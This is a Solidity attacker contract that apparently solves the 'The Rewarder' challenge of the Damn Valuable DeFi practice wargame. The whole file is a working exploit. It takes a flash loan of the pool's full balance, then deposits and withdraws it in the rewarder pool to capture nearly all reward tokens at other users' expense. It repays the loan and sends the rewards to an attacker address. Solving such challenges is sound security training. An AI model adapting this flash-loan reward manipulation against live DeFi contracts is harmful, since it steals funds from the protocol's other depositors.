// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./RewardToken.sol";

/// @title AttackerRewarderPool
/// @author kaliberpoziomka
/// @notice Attacking contract to get Reward Tokens
/** @dev Process:
1. Approve TheRewarderPool to manage your DamnValuableTokens
2. Get flash loan from FlashLoanerPool (max amount)
3. With token from flash loan deposit and withdraw reward token from Reward Token Pool.
   Because you deposit a lot of tokens, you are able to take a lot of reward tokens, and other users will get almost nothig (because of how it is computed).
4. Finish flash loan
5. Send reward tokens to attacker account 

*/

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface IDamnValuableToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

interface IRewardToken {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

contract AttackerRewarderPool {
    IFlashLoanerPool flp;
    ITheRewarderPool trp;
    IDamnValuableToken liquidityToken;
    IRewardToken rewardToken;
    address attacker;

    constructor (address _flashLoanPool, address _theRewarderPool, address _dvt, address _rtkn, address _attacker) {
        flp = IFlashLoanerPool(_flashLoanPool);
        trp = ITheRewarderPool(_theRewarderPool);
        liquidityToken = IDamnValuableToken(_dvt);
        rewardToken = IRewardToken(_rtkn);
        attacker = _attacker;
    }


    function attack() public {
        uint amount = liquidityToken.balanceOf(address(flp));
        liquidityToken.approve(address(trp), amount);
        flp.flashLoan(amount);

        uint rewardAmount = rewardToken.balanceOf(address(this));
        require(rewardAmount > 0, 'Amount of reward tokens is 0');
        bool success = rewardToken.transfer(attacker, rewardAmount);
        require(success, 'Sending reward tokens failed');
    }

    function receiveFlashLoan(uint256 amount) external {
        trp.deposit(amount);
        trp.withdraw(amount);
        require(liquidityToken.transfer(address(flp), amount));
    }

}